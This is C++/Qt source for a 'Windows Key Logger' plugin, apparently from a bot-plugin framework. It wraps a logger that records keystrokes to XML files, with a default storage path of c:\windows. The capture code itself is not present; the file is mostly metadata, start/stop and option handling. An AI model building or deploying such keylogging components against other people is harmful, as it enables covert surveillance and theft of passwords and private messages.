#include "windowskeylogger.h"

WindowsKeyLogger::WindowsKeyLogger(QObject *parent) : QObject(parent)
{
    try
    {
        mRunning = false;

    }
    catch(...)
    {
        HandleError("Unknown error in: " + QString(Q_FUNC_INFO));
    }
}

QString WindowsKeyLogger::Name()
{
    try
    {
        return "Windows Key Logger";
    }
    catch(...)
    {
        HandleError("Unknown error in: " + QString(Q_FUNC_INFO));
        return "";
    }

}

QString WindowsKeyLogger::Description()
{
    try
    {
        return "Monitors key strokes";
    }
    catch(...)
    {
        HandleError("Unknown error in: " + QString(Q_FUNC_INFO));
        return "";
    }
}

QString WindowsKeyLogger::LongDescription()
{
    try
    {
        return "Monitors key strokes and stores them to XML files for later review.";
    }
    catch(...)
    {
        HandleError("Unknown error in: " + QString(Q_FUNC_INFO));
        return "";
    }
}

QString WindowsKeyLogger::AuthorName()
{
    try
    {
        return "Bryan Cairns";
    }
    catch(...)
    {
        HandleError("Unknown error in: " + QString(Q_FUNC_INFO));
        return "";
    }
}

QString WindowsKeyLogger::AuthorURL()
{
    try
    {
        return "http://www.pluginbot.net";
    }
    catch(...)
    {
        HandleError("Unknown error in: " + QString(Q_FUNC_INFO));
        return "";
    }
}

QString WindowsKeyLogger::AuthorEmail()
{
    try
    {
        return "bcairns@pluginbot.net";
    }
    catch(...)
    {
        HandleError("Unknown error in: " + QString(Q_FUNC_INFO));
        return "";
    }
}

QString WindowsKeyLogger::Version()
{
    try
    {
        return "1.1";
    }
    catch(...)
    {
        HandleError("Unknown error in: " + QString(Q_FUNC_INFO));
        return 0;
    }
}

bool WindowsKeyLogger::Start()
{
    try
    {
        //if we are running a process or server we would attempt to start
        qDebug() << this->Name() << " started";
        mRunning = true;
        m_Logger.start();
        return mRunning;
    }
    catch(...)
    {
        HandleError("Unknown error in: " + QString(Q_FUNC_INFO));
        return false;
    }
}

bool WindowsKeyLogger::Stop()
{
    try
    {
        //if we are running a process or server we would attempt to stop
        qDebug() <<  this->Name() << " stopped";
        mRunning = false;
        m_Logger.stop();
        return mRunning;
    }
    catch(...)
    {
        HandleError("Unknown error in: " + QString(Q_FUNC_INFO));
        return false;
    }
}

void WindowsKeyLogger::Install(QString FileName)
{

    try
    {
        qDebug() <<  this->Name() << " installed at " << FileName;
    }
    catch(...)
    {
        HandleError("Unknown error in: " + QString(Q_FUNC_INFO));
    }
}

void WindowsKeyLogger::Uninstall()
{
    try
    {
        qDebug() <<  this->Name() << " uninstall called";
    }
    catch(...)
    {
        HandleError("Unknown error in: " + QString(Q_FUNC_INFO));
    }
}

bool WindowsKeyLogger::isRunning()
{
    try
    {
        return mRunning;
    }
    catch(...)
    {
        HandleError("Unknown error in: " + QString(Q_FUNC_INFO));
    }
}

void WindowsKeyLogger::Update(QVariantMap params)
{
    try
    {
        //Called when the program updates
        foreach(QString key, params.keys())
        {
            qDebug() << "Plugin Update: " << key << " = " << params.value(key).toString();
        }
    }
    catch(...)
    {
        HandleError("Unknown error in: " + QString(Q_FUNC_INFO));
    }
}

QList<QVariantMap> WindowsKeyLogger::Options()
{
    QList<QVariantMap> Options;

    try
    {
        //create a list of options

        QVariantMap optSize;
        optSize.insert("name","MaxSize");
        optSize.insert("type","number");
        optSize.insert("default","512000");
        optSize.insert("description","The maximum size in bytes for the log file");
        Options.append(optSize);


        QVariantMap optPath;
        optPath.insert("name","Path");
        optPath.insert("type","string");
        optPath.insert("default","c:\\windows");
        optPath.insert("description","The path to store the log files in.");
        Options.append(optPath);

        //Return the list of options
        return Options;

    }
    catch(...)
    {
        HandleError("Unknown error in: " + QString(Q_FUNC_INFO));
        return Options;
    }
}

void WindowsKeyLogger::Configure(QVariantMap Options)
{
    //Called before the plugin is started and updateed
    foreach(QString option, Options.keys())
    {
        qDebug() << Name() << " = " << option << " - " << Options.value(option).toString();

        if(option.toLower() == "path")
        {
            m_Logger.setPath(Options.value(option).toString());
        }

        if(option.toLower() == "maxsize")
        {
            bool bok = false;
            qint64 size = Options.value(option).toInt(&bok);

            if(bok) m_Logger.setMax(size);
        }
    }
}

void WindowsKeyLogger::HandleError(QString ErrorMessage)
{
    try
    {
        qDebug() << ErrorMessage;
    }
    catch(...)
    {
        //If we can't qDebug() then something is really wrong.
    }
}
